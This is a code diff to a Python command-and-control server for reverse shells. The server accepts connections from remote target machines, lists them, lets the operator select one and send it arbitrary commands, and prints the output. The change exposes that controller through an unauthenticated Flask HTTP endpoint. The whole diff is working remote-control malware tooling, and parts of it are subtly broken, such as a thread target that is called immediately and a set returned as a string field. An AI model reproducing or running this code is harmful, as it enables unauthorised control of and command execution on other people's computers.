@@ -1,14 +1,42 @@
 import socket  # a way two computer connected to each other
 import threading
-import sys  # run command lines in python
 from queue import Queue
 import time
+from flask import Flask
+from flask_restful import Api, Resource, reqparse, marshal_with, fields
 
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
 queue = Queue()
 all_connections = []
 all_addresses = []
+
+# wrap everything with an api
+app = Flask(__name__)
+api = Api(app)
+
+commands_args = reqparse.RequestParser()
+commands_args.add_argument(
+    "cmd", type=str, help="Command required", required=True)
+
+resource_fields = {
+    "cmd": fields.String
+}
+
+
+class Commands(Resource):
+    @marshal_with(resource_fields)
+    def post(self):
+        data = commands_args.parse_args()
+        cmd = data['cmd']
+        t = threading.Thread(target=start_turtle(cmd))
+        t.daemon = True  # stop running when the program stops
+        t.start()
+        return {"cmd": {f"{cmd}"}}
+
+
+api.add_resource(Commands, "/")
+
 # create a socket (allows two computer to connect)
 
 
@@ -57,23 +85,21 @@ def socket_accept():
         except:
             print("Error accepting connection")
 
+
 # Interactive prompt for sending commands remotely
+a = []
 
 
-def start_turtle():
-    time.sleep(0.005)
-    while True:
-        cmd = input("command>")
-        if cmd == "list":
-            list_connections()
-        elif "select" in cmd:
-            conn = get_target(cmd)
-            if conn is not None:
-                send_target_commands(conn)
-        # elif cmd == "quit":
-        #     print("Server has stopped running")
-        #     break
-        else:
+def start_turtle(cmd):
+    if cmd == "list":
+        list_connections()
+    elif "select" in cmd:
+        conn = get_target(cmd)
+        a.append(conn)
+    else:
+        try:
+            send_target_commands(a[-1], cmd)
+        except:
             print("Command not regconized")
 # display all current connections
 
@@ -84,7 +110,7 @@ def list_connections():
         try:
             # only to check if we can send the message
             conn.send(str.encode(" "))
-            conn.recv(20480)
+            conn.recv(4096)
         except:
             del all_connections[i]
             del all_addresses[i]
@@ -101,7 +127,7 @@ def get_target(cmd):
         conn = all_connections[target]
         print(f"You are now connected to {str(all_addresses[target][0])}")
         # end to not create a new line
-        print(str(all_addresses[target][0]) + "> ", end="")
+        print(f"{str(all_addresses[target][0])}>", end="")
         return conn
     except:
         print("Not a valid connection")
@@ -109,19 +135,16 @@ def get_target(cmd):
 # connect with remote target client
 
 
-def send_target_commands(conn):
-    while True:  # looks for whatever you want and send the command to the client
-        try:
-            cmd = input()
-            if len(str.encode(cmd)) > 0:
-                conn.send(str.encode(cmd))
-                client_response = str(conn.recv(20480), "utf-8")
-                print(client_response, end="")
-            if cmd == "quit":
-                break
-        except:
-            print("Connetion was lost")
-            break
+def send_target_commands(conn, cmd):
+    # looks for whatever you want and send the command to the client
+    try:
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = conn.recv(4096).decode("utf-8")
+            print(client_response)
+    except:
+        print("Connetion was lost")
+        return
 # create worker threads
 
 
@@ -138,12 +161,16 @@ def work():
     while True:
         x = queue.get()
         if x == 1:
+            app.run(debug=False)
+        if x == 2:
+            time.sleep(0.01)
             socket_create()
             socket_bind()
             socket_accept()
-        if x == 2:
-            start_turtle()
             # sys.exit()
+        # if x == 3:
+        #     time.sleep(0.01)
+        #     start_turtle()
         queue.task_done()
 
 
